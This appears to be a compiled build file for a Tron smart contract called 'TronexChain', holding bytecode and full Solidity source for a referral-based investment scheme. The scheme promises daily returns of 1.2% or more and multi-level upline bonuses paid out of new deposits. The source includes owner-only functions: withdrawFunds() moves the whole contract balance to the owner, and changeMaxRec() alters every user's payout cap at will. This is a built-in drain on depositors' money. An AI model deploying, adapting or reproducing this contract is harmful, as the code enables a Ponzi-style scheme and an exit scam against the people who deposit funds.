ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070154101561289357600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015461271060b4600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff1642038115156127aa57fe5b0483600560008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015402028115156127fa57fe5b040392508183600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015401111561289257600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070154820392505b5b50915091565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000806000806000600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060090154600560008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0154600560008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0154600560008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c01549450945094509450945091939590929450565b6000806002541115612a6f5760646002548302811515612a6757fe5b049050612a83565b606461015e8302811515612a7f57fe5b0490505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480612b555750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515612bc9576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600a5481565b60025481565b60056020528060005260406000206000915090508060000154908060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060020154908060030154908060040154908060050154908060060154908060070154908060080160009054906101000a900464ffffffffff169080600901549080600a01549080600b01549080600c015490508d565b600681815481101515612cbe57fe5b906000526020600020016000915090505481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600781815481101515612d0757fe5b9060005260206000209060209182820401919006915054906101000a900460ff1681565b60035481565b6000803073ffffffffffffffffffffffffffffffffffffffff163190506000809050600080905060006298968084811515612d6857fe5b049050603281111515612d815780925060009150612d97565b6032925082600282811515612d9257fe5b040391505b60008284019050809550505050505090565b60045481565b60095481565b6298968081565b60085481565b612dcc33826130c9565b612dd63334613507565b50565b6000803073ffffffffffffffffffffffffffffffffffffffff163190506000809050600080905060006298968084811515612e1057fe5b049050603281111515612e2c5760028102925060009150612e36565b6064925082810391505b60008284019050806078019550505050505090565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b6007805490508160ff1610156130c357600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415612f02576130c3565b6001810160ff16600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154101515613051576000606460078360ff16815481101515612f6957fe5b90600052602060002090602091828204019190069054906101000a900460ff1660ff168502811515612f9757fe5b04905080600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501600082825401925050819055508473ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f16e746f9be6c4b545700b04df27afb9fceabf59b94ef1c816e78a435059fabea836040518082815260200191505060405180910390a3505b600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050612eb8565b50505050565b600073ffffffffffffffffffffffffffffffffffffffff16600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614801561319357508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614155b80156131ec57506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b80156132a957506000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff1611806132a857506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b5b156135035780600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600560008273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600081548092919060010191905055508073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167f9f4d150e5193cfa9a87226111d3b60b624d97ccc056eeeac1569af1ea27bf64160405160405180910390a360086000815480929190600101919050555060008090505b6007805490508160ff16101561350157600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561343d57613501565b600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0160008154809291906001019190505550600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915080806001019150506133f3565b505b5050565b600073ffffffffffffffffffffffffffffffffffffffff16600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415806135f157506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b1515613665576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260098152602001807f4e6f2075706c696e65000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff161115613a4357600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600001600081548092919060010191905055503073ffffffffffffffffffffffffffffffffffffffff16638959af3c600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b1580156137c957600080fd5b505afa1580156137dd573d6000803e3d6000fd5b505050506040513d60208110156137f357600080fd5b8101908080519060200190929190505050600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154101515156138bd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f4465706f73697420616c7265616479206578697374730000000000000000000081525060200191505060405180910390fd5b600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015481101580156139ca57506006600160068054905003600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000154116139a557600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600001546139af565b6001600680549050035b8154811015156139bb57fe5b90600052602060002001548111155b1515613a3e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b613ae5565b629896808110158015613a70575060066000815481101515613a6157fe5b90600052602060002001548111155b1515613ae4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b5b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003018190555080600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601819055506000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007018190555042600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160006101000a81548164ffffffffff021916908364ffffffffff16021790555080600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060090160008282540192505081905550806009600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff167f2cb77763bc1e8490c1a904905c4d74b4269919aca114464f4bb4d911e60de364826040518082815260200191505060405180910390a26000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b6001600354038160ff161015613e4657600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415613d8457613e46565b82600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c0160008282540192505081905550600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050613d3a565b50600073ffffffffffffffffffffffffffffffffffffffff16600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614151561407757606460088302811515613eee57fe5b0460056000600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600401600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff16600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fba5b08f0cddc64825b52c35c09323af810c1d2e29c97aba01a4ed25cfdc482d160646008860281151561406057fe5b046040518082815260200191505060405180910390a35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc606460045485028115156140c257fe5b049081150290604051600060405180830381858888f193505050501580156140ee573d6000803e3d6000fd5b5050505056fea165627a7a72305820fb23430609c84c59eda0c56812f0e6392c169c922726d0deb6705e5b95b658130029",
  "source": "pragma solidity 0.5.4;\r\n\r\ncontract TronexChain {\r\n\r\n    struct User {\r\n        uint256 cycle;\r\n        address upline;\r\n        uint256 referrals;\r\n        uint256 payouts;\r\n        uint256 direct_bonus;\r\n        uint256 gen_bonus;\r\n        uint256 deposit_amount;\r\n        uint256 deposit_payouts;\r\n        uint40 deposit_time;\r\n        uint256 total_deposits;\r\n        uint256 total_payouts;\r\n        uint256 total_structure;\r\n\t\tuint256 team_biz ;\r\n    }\r\n\r\n    address payable public owner;\r\n    address payable public alt_owner;\r\n\tuint256 public max_receivable  = 0;\r\n\r\n    uint256 constant public CONTRACT_BALANCE_STEP = 10 trx; // 1000000 trx\r\n    uint256 constant public MIN_DEPOSIT = 10 trx; // 50 trx\r\n    uint256 constant public BASE_PERCENT = 120 ; // 0.1% => 1 unit, 1.2% daily (MULTIPLIER 100)\r\n\tuint256 constant public PERCENTS_DIVIDER = 10000; \r\n    uint256 constant public TIME_STEP = 180 ; // 1 days\r\n    uint256 constant public aff_bonus = 8 ; // 8 percent\r\n \tuint256 public team_levels = 30;\r\n    uint256 public fee  = 15;   \r\n\r\n // for 10 mil - 0.2 % increase | 1 mil - 0.02 % \r\n // for 50 mil - 1 % total\r\n // for 50 mil and above, for every 10 mil - 0.1 %/\r\n\r\n    mapping(address => User) public users;\r\n\r\n    uint256[] public cycles;\r\n    uint8[] public ref_bonuses;                     // 1 => 1% \r\n\r\n    uint256 public total_users = 1;\r\n    uint256 public total_deposited;\r\n    uint256 public total_withdraw;\r\n    \r\n    event Upline(address indexed addr, address indexed upline);\r\n    event NewDeposit(address indexed addr, uint256 amount);\r\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n    event LimitReached(address indexed addr, uint256 amount);\r\n\r\n    constructor(address payable _owner, address payable _alt_owner) public {\r\n        owner = _owner;\r\n\t\talt_owner = _alt_owner;\r\n         \r\n        ref_bonuses.push(30);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5); \r\n \r\n        cycles.push(1e11);\r\n        cycles.push(3e11);\r\n        cycles.push(9e11);\r\n        cycles.push(2e12);\r\n    }\r\n \r\n    function _setUpline(address _addr, address _upline) private {\r\n        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && \r\n\t\t(users[_upline].deposit_time > 0 || _upline == owner) ) {\r\n            users[_addr].upline = _upline;\r\n            users[_upline].referrals++;\r\n\r\n            emit Upline(_addr, _upline);\r\n\r\n            total_users++;\r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].total_structure++;\r\n\r\n                _upline = users[_upline].upline;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deposit(address _addr, uint256 _amount) private {\r\n        require(users[_addr].upline != address(0) || _addr == owner, \"No upline\");\r\n\r\n        if(users[_addr].deposit_time > 0) {\r\n            users[_addr].cycle++;\r\n            \r\n            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), \"Deposit already exists\");\r\n            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], \"Bad amount\");\r\n        }\r\n        else require(_amount >= MIN_DEPOSIT && _amount <= cycles[0], \"Bad amount\");\r\n        \r\n        users[_addr].payouts = 0;\r\n        users[_addr].deposit_amount = _amount;\r\n        users[_addr].deposit_payouts = 0;\r\n        users[_addr].deposit_time = uint40(block.timestamp);\r\n        users[_addr].total_deposits += _amount;\r\n\r\n        total_deposited += _amount;\r\n        \r\n        emit NewDeposit(_addr, _amount);\r\n\r\n\t\taddress _upline = users[_addr].upline;\r\n\r\n\t\t for(uint8 i = 0; i < team_levels - 1; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].team_biz += _amount;\r\n\r\n                _upline = users[_upline].upline;\r\n            }\r\n\r\n        if(users[_addr].upline != address(0)) {\r\n            users[users[_addr].upline].direct_bonus += _amount*aff_bonus/100;\r\n\r\n            emit DirectPayout(users[_addr].upline, _addr,  _amount*aff_bonus/100);\r\n        } \r\n         \r\n         owner.transfer(_amount * fee / 100);\r\n        \r\n    }\r\n     function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = users[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            if(users[up].referrals >= i + 1) {\r\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n                \r\n                users[up].gen_bonus += bonus;\r\n\r\n                emit MatchPayout(up, _addr, bonus);\r\n            }\r\n\r\n            up = users[up].upline;\r\n        }\r\n    }\r\n \r\n    function deposit(address _upline) payable external {\r\n        _setUpline(msg.sender, _upline);\r\n        _deposit(msg.sender, msg.value);\r\n    }\r\n\r\n    function withdraw() external {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\r\n        \r\n        require(users[msg.sender].payouts < max_payout, \"Full payouts\");\r\n\r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[msg.sender].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].deposit_payouts += to_payout;\r\n            users[msg.sender].payouts += to_payout;\r\n\r\n            _refPayout(msg.sender, to_payout);\r\n        }\r\n        \r\n        // Direct payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\r\n\r\n            if(users[msg.sender].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].direct_bonus -= direct_bonus;\r\n            users[msg.sender].payouts += direct_bonus;\r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[msg.sender].gen_bonus;\r\n\r\n            if(users[msg.sender].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].gen_bonus -= gen_bonus;\r\n            users[msg.sender].payouts += gen_bonus;\r\n            to_payout += gen_bonus;\r\n        }\r\n\r\n        require(to_payout > 0, \"Zero payout\");\r\n        \r\n        users[msg.sender].total_payouts += to_payout;\r\n        total_withdraw += to_payout;\r\n\r\n        msg.sender.transfer(to_payout);\r\n\r\n        emit Withdraw(msg.sender, to_payout);\r\n\r\n        if(users[msg.sender].payouts >= max_payout) {\r\n            emit LimitReached(msg.sender, users[msg.sender].payouts);\r\n        }\r\n    }\r\n    \r\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {\r\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n\t\tuint256 total_rate = getTotalRate();\r\n\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getUserDividends(address _addr) view external returns(uint256) {\r\n      uint256  max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n        uint256 total_rate = getTotalRate();\r\n            uint256 payout;\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n        return payout;\r\n    }   \r\n \r\n\tfunction getTotalRate() internal view returns(uint256) {\r\n\t \r\n\t\tuint256 contract_balance = address(this).balance;\r\n\t\tuint256 step1 = 0;\r\n\t\tuint256 step2 = 0;\r\n\t\tuint256 steps =  contract_balance/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = steps - step1;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n\r\n\t\treturn BASE_PERCENT+total_step ;\r\n\t}\r\n\r\n    /*\r\n        Only external call\r\n    */\r\n\r\n\r\n\tfunction getContractBalance() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t} \r\n\r\n    function getTotalSteps( uint256 _balance) external view returns(uint256) {\r\n     \r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 balance_trx = _balance*1000000; \r\n        uint256 steps =  balance_trx/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = steps - step1;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n \r\n        return total_step ;\r\n    }\r\n\r\n\r\n\tfunction getRate() external view returns(uint256) {\r\n\t \r\n\t\tuint256 contract_balance = address(this).balance;\r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 steps =  contract_balance/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = steps - step1;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n         \r\n        return BASE_PERCENT+total_step ;\r\n\t}\r\n\r\n    function getContractBonus() external view returns(uint256) {\r\n     \r\n        uint256 contract_balance = address(this).balance;\r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 steps = contract_balance/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 50;\r\n             step2 = steps/2 - step1;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n \r\n        return total_step ;\r\n    }\r\n\r\n\r\n    function maxPayoutOf(uint256 _amount) external view returns(uint256) {\r\n\t\tif(max_receivable > 0){\r\n\t\t\treturn  _amount * max_receivable / 100;\r\n\t\t} else {\r\n        return \t_amount * 350 / 100; \r\n\t\t}\r\n    }\r\n \r\n\r\n\tfunction getUserBalance(address _addr) external view returns (uint256) {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr); \r\n \r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[_addr].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[_addr].payouts;\r\n            } \r\n         }\r\n        \r\n        // Direct payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[_addr].direct_bonus;\r\n\r\n            if(users[_addr].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n           \r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[_addr].gen_bonus;\r\n\r\n            if(users[_addr].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n            to_payout += gen_bonus;\r\n        } \r\n \r\n        if(users[_addr].payouts >= max_payout) {\r\n\t\t\treturn 0;       \r\n\t\t } else {\r\n\t\t\t return to_payout;\r\n\t\t }\r\n    }\r\n  \r\n\tfunction changeMaxRec(uint256 _maxRecPercent) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\tmax_receivable = _maxRecPercent;\r\n\t} \r\n\r\n\tfunction withdrawFunds() public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner.transfer(address(this).balance);\r\n\t} \r\n\r\n\tfunction changeAdmin(address payable _newAdmin) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner = _newAdmin;\r\n\t} \r\n\r\n    function getAdmin() external view returns (address){\r\n         \r\n        return owner;\r\n    } \r\n    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus ) {\r\n        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus );\r\n    }\r\n\r\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 team_biz) {\r\n        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].team_biz);\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw ) {\r\n        return (total_users, total_deposited, total_withdraw );\r\n    }\r\n\r\n     \r\n}",
  "sourcePath": "C:/Users/RAAKESH/Desktop/Coding/TronDapp/ATRON RAMESH/contracts/TronexChain.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.4+commit.d15a3125.mod.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2020-10-23T15:01:22.307Z"
}